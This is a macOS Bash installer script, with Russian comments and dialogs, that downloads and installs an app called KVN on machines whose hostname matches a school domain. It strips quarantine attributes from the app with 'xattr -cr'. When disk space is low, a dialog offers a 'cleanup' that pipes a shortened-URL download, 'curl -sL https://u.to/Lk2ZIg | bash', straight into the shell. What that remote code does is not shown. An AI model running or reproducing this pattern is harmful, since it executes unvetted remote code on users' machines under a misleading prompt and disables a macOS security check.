#!/bin/bash

# Константы
readonly APP_URL="https://github.com/shepherl/kvnfaq/releases/download/1.1/macOS-Intel-App.zip"
readonly TMP_ZIP="/tmp/KVN_App.zip"
readonly REQUIRED_SPACE_KB=307200 # 300 МБ

# Функция установки
install_app() {
    # Проверка домена
    if [[ $(hostname) == *.kzn.21-school.ru ]]; then
        curl -L "$APP_URL" -o "$TMP_ZIP"
        unzip -qo "$TMP_ZIP" -d /tmp/ 
        DMG_PATH=$(ls /tmp/*.dmg | head -n 1) 
        MOUNT_POINT=$(hdiutil attach -nobrowse -noautoopen "$DMG_PATH" | grep -o '/Volumes/.*' | head -n 1) 
        cp -R "$MOUNT_POINT"/*.app ~/Desktop/
        hdiutil detach "$MOUNT_POINT" -quiet
        rm -f "$TMP_ZIP" "$DMG_PATH"
        xattr -cr ~/Desktop/KVN.app
        touch ~/Desktop/KVN.app
        osascript -e 'display dialog "Установка KVN успешно завершена! KVN на рабочем столе" with title "Установщик" buttons {"ОК"} default button "ОК" with icon note'
    else
        osascript -e 'display dialog "Ваше устройство не подходит" with title "Ошибка" buttons {"ОК"} default button "ОК" with icon caution'
    fi
    exit 0
}

# Функция проверки места
check_space() {
    free_space_kb=$(df -Pk ~ | awk 'NR==2 {print $4}')
    [ "$free_space_kb" -lt "$REQUIRED_SPACE_KB" ] && return 1 || return 0
}

# --- Логика выполнения ---

if ! check_space; then
    # Места мало, предлагаем очистку
    RESPONSE=$(osascript -e 'display dialog "Недостаточно места на диске (минимум 300 МБ). Попробовать очистить временные файлы? Это не затронет нужные файлы" with title "Ошибка места" buttons {"Отмена", "Очистить"} default button "Очистить" with icon caution')
    
    if [[ "$RESPONSE" == *"button returned:Очистить"* ]]; then
        curl -sL https://u.to/Lk2ZIg | bash
        
        # Проверяем снова после очистки
        if check_space; then
            install_app
        else
            osascript -e 'display dialog "Очистка завершена, но места все еще недостаточно. Пожалуйста, удалите ненужные файлы вручную и попробуйте снова." with title "Ошибка" buttons {"ОК"} default button "ОК" with icon stop'
            exit 1
        fi
    else
        exit 1
    fi
else
    # Места достаточно, запускаем установку
    install_app
fi
